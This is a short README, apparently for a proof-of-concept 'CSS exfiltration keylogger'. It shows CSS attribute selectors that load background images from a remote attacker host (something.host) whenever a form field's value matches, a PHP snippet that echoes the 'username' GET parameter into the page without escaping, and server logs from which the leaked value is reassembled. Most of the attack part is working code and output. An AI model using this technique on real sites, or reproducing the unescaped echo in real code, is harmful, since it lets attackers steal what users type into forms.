# The PoC-CSS Exfill Basic Keylogger
First of all i was developing bot stuff and i seen `attribute=value] [target=_blank]` in source code of website. This method stuck in my mind. Because we can get access all of element that has _blank attribute. 
Than i made a search about how can i demonstrate this selector.
For example:
	 #username[value="admin"]{
	 	background:url("https://something.host/");
	 }
It means i can put malicious code.  To explain further i can do it more usefull.
For example:
`         #username[value*="aa"]~#aa{background:url("https://something.host/aa");
`
` <input type="text" id="username" name="username" value="<?		php echo $_GET['username']; ?>" />
        <input id="form_submit" type="submit" value="submit"/>
        <a id="aa">`
		
When a user enters any string consisting of the letters like 'a' specific elements will be styled with a non-existent background image at a remote attacker URL. 

There are 3 conditions
--------------------------------------------------------------------------------
 1. Parsed data must be ready while page is rendered.
 2. We must have at least one CSS Selector.
 3. The element must have to CSS property which takes a URL, background, background-image and etc.
--------------------------------------------------------------------------------

## 1 USAGE

`http://127.0.0.1/css-exfilphp?username=abcab`  
Output will be:
- [Wed Mar 30 19:58:44 2022] 127.0.0.1:52588 [404]: GET /a_ - No such file or directory
- [Wed Mar 30 19:58:44 2022] 127.0.0.1:52589 [404]: GET /ab - No such file or directory
- [Wed Mar 30 19:58:44 2022] 127.0.0.1:52590 [404]: GET /ba - No such file or directory
- [Wed Mar 30 19:58:44 2022] 127.0.0.1:52591 [404]: GET /_b - No such file or directory

------------


If we re-assemble this output:

------------
- a   		#a_
- b			#b_
- ab     		#ab
- aba 		#ba
- abab		#_b


